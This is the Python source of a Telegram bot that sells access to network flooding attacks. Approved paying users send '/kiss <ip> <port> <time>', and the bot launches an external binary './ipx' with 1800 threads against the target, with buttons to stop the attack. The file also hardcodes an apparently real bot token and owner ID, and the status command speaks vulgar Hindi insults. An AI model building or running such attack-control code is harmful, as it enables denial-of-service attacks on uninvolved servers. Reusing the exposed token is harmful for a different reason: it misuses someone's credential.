import subprocess
import psutil
import speedtest
from datetime import datetime
from gtts import gTTS
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, ContextTypes

# Bot Configuration
TOKEN = "7564285623:AAF9EeSHMDAR5UF2IFFKAZBNcDvevqGYzis"
OWNER_ID = "930577300"

# Data Storage for Admins and Approved Users
approved_users = set()
admin_users = {OWNER_ID}

# Store process reference for killing attacks
attack_process = None
start_time = datetime.now()  # Track bot uptime

# Function to generate Hindi voice dynamically
def generate_voice(text):
    tts = gTTS(text, lang='hi')
    filename = "hindi_warning.mp3"
    tts.save(filename)
    return filename

# Command: /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("Welcome! Use /help to see available commands.")

# Command: /help
async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    help_text = """
Commands List:
/start - Welcome Message
/help - Command Usage Guide
/kiss <ip> <port> <time> - Start Attack
/status - Bot Performance Status
/uptime - Check Bot Uptime
/ping - Check Bot Ping
/add <userid> - Approve User (Admin Only)
/remove <userid> - Disapprove User
/broadcast <message> - Send Message to Approved Users (Admin Only)
/addadmin <userid> - Add Admin
/deladmin <userid> - Remove Admin
/owner - Show Bot Owner Info
"""
    await update.message.reply_text(help_text)

# Command: /status
async def status(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    hindi_text = "तेरी माँ की चूत रंडी मालिक को पापा बोल ।"
    voice_file = generate_voice(hindi_text)

    await update.message.reply_voice(voice=open(voice_file, 'rb'))

    # System Status Info
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory().percent
    load_avg = psutil.getloadavg()[0]

    status_msg = (
        f"💻 CPU Usage: {cpu_usage}%\n"
        f"🧠 Memory Usage: {memory_info}%\n"
        f"⚙️ System Load: {load_avg:.2f}"
    )

    await update.message.reply_text(status_msg)

# Command: /uptime
async def uptime(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    uptime_duration = datetime.now() - start_time
    await update.message.reply_text(f"⏳ Bot Uptime: {str(uptime_duration).split('.')[0]}")

# Command: /ping
async def ping(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    st = speedtest.Speedtest()
    st.get_best_server()
    ping_value = round(st.results.ping, 2)
    await update.message.reply_text(f"🏓 Bot Ping: {ping_value} ms")

# Command: /kiss (Start attack)
async def kiss(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global attack_process  

    if str(update.message.from_user.id) not in approved_users:
        await update.message.reply_text("❌ Access denied! Get approval from the owner.")
        return

    if len(context.args) != 3:
        await update.message.reply_text("❌ Correct Usage: /kiss <ip> <port> <time>")
        return

    ip, port, time = context.args

    # Add '1800' as the threads argument
    attack_process = subprocess.Popen(["./ipx", ip, port, time, "1800"])

    keyboard = [
        [InlineKeyboardButton("🔥 Hit", callback_data="hit")],
        [InlineKeyboardButton("🛑 Kill", callback_data="kill")],
        [InlineKeyboardButton("🖥️ CPU Usage", callback_data="cpu")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    await update.message.reply_animation("https://media.giphy.com/media/3oEjI6SIIHBdRxXI40/giphy.gif")
    await update.message.reply_text(
        f"⚡ Attack started on {ip}:{port} for {time} seconds with 1800 threads!",
        reply_markup=reply_markup
    )

# Button Handler
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == "hit":
        await query.edit_message_text("🔥 Hit Confirmed! Attack in progress...")

    elif query.data == "kill":
        global attack_process
        if attack_process:
            attack_process.terminate()
            attack_process = None
            await query.edit_message_text("🛑 Attack successfully terminated!")
            await query.message.reply_text("✅ Sex done!")

    elif query.data == "cpu":
        cpu_usage = psutil.cpu_percent(interval=1)
        await query.edit_message_text(f"🖥️ Current CPU Usage: {cpu_usage}%")

# Command: /owner
async def owner(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    await update.message.reply_text("👑 My Creative Owner is @PYSCHOxKINGYT. SEND MESSAGE TO BUY APPROVAL")

# Command: /add (Add User to Approved List)
async def add(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if str(update.message.from_user.id) not in admin_users:
        await update.message.reply_text("❌ Admin access required!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ Correct Usage: /add <userid>")
        return

    approved_users.add(context.args[0])
    await update.message.reply_text(f"✅ User {context.args[0]} added to the approved list.")

# Command: /remove (Remove User from Approved List)
async def remove(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if str(update.message.from_user.id) not in admin_users:
        await update.message.reply_text("❌ Admin access required!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ Correct Usage: /remove <userid>")
        return

    approved_users.discard(context.args[0])
    await update.message.reply_text(f"✅ User {context.args[0]} removed from the approved list.")

# Command: /broadcast (Send message to approved users)
async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if str(update.message.from_user.id) not in admin_users:
        await update.message.reply_text("❌ Admin access required!")
        return

    if len(context.args) == 0:
        await update.message.reply_text("❌ Correct Usage: /broadcast <message>")
        return

    message = " ".join(context.args)
    for user_id in approved_users:
        await context.bot.send_message(chat_id=user_id, text=message)

    await update.message.reply_text("✅ Broadcast message sent!")

# Command: /addadmin (Add Admin)
async def addadmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if str(update.message.from_user.id) != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can add admins!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ Correct Usage: /addadmin <userid>")
        return

    admin_users.add(context.args[0])
    await update.message.reply_text(f"✅ User {context.args[0]} added as an admin.")

# Command: /deladmin (Remove Admin)
async def deladmin(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if str(update.message.from_user.id) != OWNER_ID:
        await update.message.reply_text("❌ Only the owner can remove admins!")
        return

    if len(context.args) != 1:
        await update.message.reply_text("❌ Correct Usage: /deladmin <userid>")
        return

    admin_users.discard(context.args[0])
    await update.message.reply_text(f"✅ User {context.args[0]} removed from admin list.")

# Main Function
# Main Function
def main():
    app = ApplicationBuilder().token(TOKEN).build()

    # Adding all necessary command handlers
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("kiss", kiss))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("uptime", uptime))
    app.add_handler(CommandHandler("ping", ping))
    app.add_handler(CommandHandler("add", add))
    app.add_handler(CommandHandler("remove", remove))
    app.add_handler(CommandHandler("broadcast", broadcast))
    app.add_handler(CommandHandler("addadmin", addadmin))
    app.add_handler(CommandHandler("deladmin", deladmin))
    app.add_handler(CommandHandler("owner", owner))

    # Adding button callback handler
    app.add_handler(CallbackQueryHandler(button_handler))

    print("🚀 Bot is running...")
    app.run_polling()

if __name__ == "__main__":
    main()
